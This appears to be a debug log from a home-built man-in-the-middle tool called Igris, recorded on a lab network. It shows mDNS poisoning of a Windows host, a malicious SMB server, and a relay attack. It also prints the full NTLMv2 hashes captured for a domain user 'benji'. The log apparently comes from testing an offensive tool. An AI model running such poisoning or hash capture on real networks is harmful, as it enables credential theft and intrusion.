2021-11-13 16:18:43.488 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:18:43.490 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
2021-11-13 16:18:43.492 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:45 - {'AUTHENTICATE_MESSAGE (RSGBENGICORP\\benji,PC-BENJI)': None}
2021-11-13 16:18:47.368 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-13 16:20:30.611 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-13 16:20:30.612 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-13 16:20:30.618 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-13 16:20:30.626 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-13 16:20:30.628 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-13 16:20:30.631 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-13 16:20:30.632 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-13 16:20:30.633 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-13 16:20:36.698 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:36.698 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:36.698 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-13 16:20:36.737 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:36.738 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:36.738 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-13 16:20:36.780 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:36.781 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:36.785 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:36.785 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:37.689 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:37.690 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:37.694 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:37.695 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:37.699 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49960)
2021-11-13 16:20:37.739 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-13 16:20:37.742 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-13 16:20:37.744 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:eaa748f19e357c1956d7358ed079c1d9:010100000000000080385464aad8d701af98e7dd9a508397000000000100100062006e004c006c004800620057007a000300100062006e004c006c004800620057007a000200100051006700580063004100630061004b000400100051006700580063004100630061004b000700080080385464aad8d701060004000200000008003000300000000000000000000000002000003a4fb5668faeb1b5d108dff6d40f476b221a679f0a3cd211bda187f25fb6fa6c0a0010000000000000000000000000000000000009004e0063006900660073002f0063006f00630068006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f00650065002e006c006f00630061006c000000000000000000
2021-11-13 16:20:37.746 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:49 - holiiiiiij
2021-11-13 16:20:37.747 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:51 - adiossss
2021-11-13 16:20:37.748 | INFO     | impacket.smbserver:log:4132 - Could not write NTLM Hashes to the specified JTR_Dump_Path 
2021-11-13 16:20:37.773 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-13 16:20:39.485 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:39.486 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:39.492 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:39.492 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:39.497 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:39.497 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:39.502 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:39.502 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:40.471 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:40.472 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:40.476 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:40.477 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:40.481 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:40.482 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:40.486 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:40.486 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:48.435 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
2021-11-13 16:20:48.445 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,49960)
2021-11-13 16:20:48.447 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
2021-11-13 16:20:53.675 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:53.675 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:53.675 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-13 16:20:53.708 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:53.709 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:53.709 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-13 16:20:53.742 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:53.742 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:53.744 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:53.745 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:54.686 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:54.686 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:54.692 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:54.693 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:54.694 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49961)
2021-11-13 16:20:54.718 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-13 16:20:54.720 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-13 16:20:54.722 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:1fe1c25540258890ccaa9d7b2efee317:01010000000000000037766eaad8d701cdea2751fb5451de000000000100100062006e004c006c004800620057007a000300100062006e004c006c004800620057007a000200100051006700580063004100630061004b000400100051006700580063004100630061004b00070008000037766eaad8d701060004000200000008003000300000000000000000000000002000003a4fb5668faeb1b5d108dff6d40f476b221a679f0a3cd211bda187f25fb6fa6c0a0010000000000000000000000000000000000009004e0063006900660073002f0063006f00630068006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f00650065002e006c006f00630061006c000000000000000000
2021-11-13 16:20:54.724 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:49 - holiiiiiij
2021-11-13 16:20:54.726 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:51 - adiossss
2021-11-13 16:20:54.729 | INFO     | impacket.smbserver:log:4132 - Could not write NTLM Hashes to the specified JTR_Dump_Path 
2021-11-13 16:20:54.754 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-13 16:20:56.737 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:56.738 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:56.743 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:56.743 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:56.748 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:56.749 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:56.752 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:56.752 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:57.741 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:57.742 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:57.746 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:57.747 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:57.755 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:57.756 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:20:57.760 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:20:57.760 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:21:00.572 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-13 16:22:08.414 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-13 16:22:08.415 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-13 16:22:08.422 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-13 16:22:08.431 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-13 16:22:08.431 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-13 16:22:08.438 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-13 16:22:08.439 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-13 16:22:08.446 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-13 16:22:12.339 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:22:12.340 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:22:12.340 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-13 16:22:12.373 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:22:12.373 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:22:12.373 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-13 16:22:12.408 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:22:12.409 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:22:12.414 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:22:12.415 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:22:13.353 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:22:13.354 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:22:13.360 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:22:13.362 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:22:13.364 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49963)
2021-11-13 16:22:13.392 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-13 16:22:13.393 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-13 16:22:13.394 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:e1badb4864079096d020f0e52233a01a:010100000000000080a88c9daad8d701362e745aac025e1c00000000010010005300730048006c005700560047004400030010005300730048006c005700560047004400020010004c00570059005a006e00530064004a00040010004c00570059005a006e00530064004a000700080080a88c9daad8d701060004000200000008003000300000000000000000000000002000003a4fb5668faeb1b5d108dff6d40f476b221a679f0a3cd211bda187f25fb6fa6c0a0010000000000000000000000000000000000009004e0063006900660073002f0063006f00630068006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f006f00650065002e006c006f00630061006c000000000000000000
2021-11-13 16:22:13.395 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:49 - holiiiiiij
2021-11-13 16:22:13.396 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:51 - /home/rsgbengi/Igris
2021-11-13 16:22:13.397 | INFO     | impacket.smbserver:log:4132 - Could not write NTLM Hashes to the specified JTR_Dump_Path 
2021-11-13 16:22:13.418 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-13 16:22:13.612 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:22:13.613 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:22:13.618 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:22:13.618 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:22:13.622 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:22:13.623 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:22:13.627 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:22:13.628 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:22:14.618 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:22:14.619 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:22:14.624 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-13 16:22:14.624 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-13 16:22:16.348 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-13 16:23:18.789 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-13 16:23:18.790 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-13 16:23:18.792 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
